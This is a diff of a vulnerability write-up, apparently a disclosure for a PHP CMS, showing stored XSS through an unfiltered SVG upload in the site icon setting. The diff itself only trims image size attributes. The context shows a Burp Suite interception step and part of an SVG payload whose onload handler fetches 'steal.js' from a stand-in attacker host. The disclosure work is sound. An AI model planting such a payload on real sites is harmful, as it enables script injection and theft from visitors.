@@ -39,28 +39,21 @@ unproceedable. The system is deployed on Apache/2.4.39 + PHP/7.3.4 +
 MySQL/5.7.26 (WINNT), and the backend access address is
 http://\[Server-IP\]/index.php/admin4883/login/index.html.
 
-![](images/media/image1.png){width="4.0625in"
-height="3.263888888888889in"}
+![](images/media/image1.png)
 
-![](images/media/image2.png){width="5.759722222222222in"
-height="2.8916666666666666in"}
+![](images/media/image2.png)
 
-![](images/media/image3.png){width="5.759722222222222in"
-height="3.0416666666666665in"}
+![](images/media/image3.png)
 
-![](images/media/image4.png){width="5.759722222222222in"
-height="2.834722222222222in"}
+![](images/media/image4.png)
 
-![](images/media/image5.png){width="5.759722222222222in"
-height="3.1354166666666665in"}
+![](images/media/image5.png)
 
-![](images/media/image6.png){width="5.759722222222222in"
-height="3.0243055555555554in"}
+![](images/media/image6.png)
 
 Installation completed. Frontend Homepage: http://localhost/index.php
 
-![](images/media/image7.png){width="5.759722222222222in"
-height="3.0243055555555554in"}
+![](images/media/image7.png)
 
 Installation completed. Admin Backend:
 
@@ -69,8 +62,7 @@ Installation completed. Admin Backend:
 We can check the website system version, and the current version is
 v1.2.61.
 
-![](images/media/image8.png){width="5.759722222222222in"
-height="3.0722222222222224in"}
+![](images/media/image8.png)
 
 When accessing via a browser using 127.0.0.1 or localhost, Burp Suite
 cannot capture the packets; access via the actual IP address is
@@ -86,24 +78,20 @@ XSS - Cross-Site Scripting Attack: Unrestricted Upload of SVG with XSS
 Click on Site, then Basic Settings, and click Replace in the URL Icon
 section to change the icon, as shown in the figure:
 
-![](images/media/image9.png){width="5.764583333333333in"
-height="2.8979166666666667in"}
+![](images/media/image9.png)
 
-![](images/media/image10.png){width="5.759722222222222in"
-height="2.8743055555555554in"}
+![](images/media/image10.png)
 
 When replacing the icon, capture the traffic with BurpSuite and
 intercept the image upload request packet, as shown in the figure:
 
-![](images/media/image11.png){width="5.761805555555555in"
-height="3.4993055555555554in"}
+![](images/media/image11.png)
 
 Change the image file extension (e.g., .png) to the .svg file extension.
 
 SVG files can be uploaded successfully, as shown in the figure:
 
-![](images/media/image12.png){width="5.760416666666667in"
-height="3.1416666666666666in"}
+![](images/media/image12.png)
 
 Upload the SVG file with the payload embedded in its content; the
 program fails to filter the payload, leading directly to an XSS
@@ -120,16 +108,14 @@ onload=\"fetch(\'hxxp://attacker.com/steal.js\')\"\>
 
 \</svg\>
 
-![](images/media/image13.png){width="5.7652777777777775in"
-height="3.392361111111111in"}
+![](images/media/image13.png)
 
 The SVG file containing the payload is uploaded successfully, and the
 payload can be executed by directly accessing the file via a browser:
 
 http://192.168.219.183/uploads/files/20260304/d391743ff06f04f1.svg
 
-![](images/media/image14.png){width="5.759722222222222in"
-height="2.6819444444444445in"}
+![](images/media/image14.png)
 
 Request Packet:
 
